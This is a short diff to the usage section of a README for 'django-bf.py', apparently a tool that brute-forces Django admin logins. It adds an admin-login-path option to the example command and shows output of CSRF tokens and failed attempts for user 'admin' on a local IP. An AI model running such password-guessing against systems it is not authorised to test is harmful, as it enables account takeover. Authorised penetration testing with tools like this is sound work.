@@ -19,7 +19,7 @@ Example usage
 ---
 
 ```
-python3 django-bf.py -u http://192.168.1.130:8081 -f test.txt
+python3 django-bf.py -u http://192.168.1.130:8081 -f test.txt -au /admin/login/
 [*] Token:MRLQSL6PDQveXw1k3L9BSZfCAYO2vEpONxnuv3cd3LeOy3C2TlIUB9utppi1G298 [*]
 [-] Failed to login with user: admin [-]
 [*] Token:YPkI8Zj2q6txyBCFbI4Tan5fMaa6NcAYZvWmLhpqQ1c798dn1iDcTxk6BBE5YAki [*]
